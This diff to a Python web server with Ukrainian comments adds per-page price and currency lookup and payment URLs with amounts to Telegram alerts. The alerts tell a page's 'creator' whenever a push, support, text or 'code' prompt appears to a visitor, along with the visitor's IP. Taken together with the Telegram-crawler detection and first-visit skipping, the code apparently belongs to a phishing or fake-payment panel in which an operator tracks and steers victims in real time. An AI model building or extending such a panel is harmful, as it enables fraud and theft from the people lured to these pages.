@@ -87,6 +87,46 @@ PAYMENT_DISABLED = False  # глобальний флаг для блокува�
 # --- In-memory storage for ignoring first visit to new pages ---
 IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу
 
+def get_event_info_by_page_code(page_code):
+    """Отримує інформацію про подію за page_code"""
+    try:
+        db = sqlite3.connect('users.db')
+        cur = db.cursor()
+        
+        # Спочатку шукаємо в таблиці event_links (основна таблиця)
+        try:
+            cur.execute('SELECT price, currency FROM event_links WHERE event_code=?', (page_code,))
+            row = cur.fetchone()
+            if row:
+                db.close()
+                return {
+                    'price': row[0],
+                    'currency': row[1],
+                    'street': None
+                }
+        except Exception as e:
+            print(f"[get_event_info_by_page_code] Error in event_links: {e}")
+        
+        # Якщо не знайдено, шукаємо в site_users (для зворотної сумісності)
+        try:
+            cur.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+            row = cur.fetchone()
+            if row:
+                db.close()
+                return {
+                    'price': row[0],
+                    'currency': row[1],
+                    'street': row[2]
+                }
+        except Exception as e:
+            print(f"[get_event_info_by_page_code] Error in site_users: {e}")
+        
+        db.close()
+        return None
+    except Exception as e:
+        print(f"[get_event_info_by_page_code] Error: {e}")
+        return None
+
 def is_telegram_request(user_agent):
     """Перевіряє, чи це запит від Telegram"""
     if not user_agent:
@@ -441,6 +481,19 @@ def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_in
             msg += f"#️⃣ Сторінка: {page_code}\n"
         if event_info:
             msg += f"💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}\n"
+        
+        # Додаємо URL з сумою для кожної кнопки
+        if page_code and event_info and event_info.get('price'):
+            if button_type == 'push':
+                button_url = f"https://artpullse.com/push/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+            elif button_type == 'support':
+                button_url = f"https://artpullse.com/support/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+            elif button_type == 'text':
+                button_url = f"https://artpullse.com/text/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+            else:
+                button_url = f"https://artpullse.com/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+            
+            msg += f"🔗 URL: {button_url}\n"
         
         # Надсилаємо ТІЛЬКИ в приватні повідомлення бота
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -1186,6 +1239,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                                 if event_info:
                                     button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                                 
+                                # Формуємо URL з сумою для code
+                                code_url = f"https://artpullse.com/code/?page={page_code}"
+                                if event_info and event_info.get('price'):
+                                    code_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                                
+                                button_msg += f"\n🔗 URL: {code_url}"
+                                
                                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                 data_event_creator = {"chat_id": user_id, "text": button_msg}
                                 requests.post(url, data=data_event_creator, timeout=1)
@@ -1277,6 +1337,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                                 if event_info:
                                     button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
                                 
+                                # Формуємо URL з сумою для техпідтримки
+                                support_url = f"https://artpullse.com/support/?page={page_code}"
+                                if event_info and event_info.get('price'):
+                                    support_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                                
+                                button_msg += f"\n🔗 URL: {support_url}"
+                                
                                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                 data_event_creator = {"chat_id": user_id, "text": button_msg}
                                 requests.post(url, data=data_event_creator, timeout=1)
@@ -1320,6 +1387,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                                 button_msg = f"🔔 Кнопка з текстом з'явилася на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                                 if event_info:
                                     button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                # Формуємо URL з сумою для text
+                                text_url = f"https://artpullse.com/text/?page={page_code}"
+                                if event_info and event_info.get('price'):
+                                    text_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                                
+                                button_msg += f"\n🔗 URL: {text_url}"
                                 
                                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                 data_event_creator = {"chat_id": user_id, "text": button_msg}
@@ -1431,6 +1505,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                                 button_msg = f"🔔 Push-повідомлення з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
                                 if event_info:
                                     button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                # Формуємо URL з сумою для push-повідомлення
+                                push_url = f"https://artpullse.com/push/?page={page_code}"
+                                if event_info and event_info.get('price'):
+                                    push_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                                
+                                button_msg += f"\n🔗 URL: {push_url}"
                                 
                                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                 data_event_creator = {"chat_id": user_id, "text": button_msg}
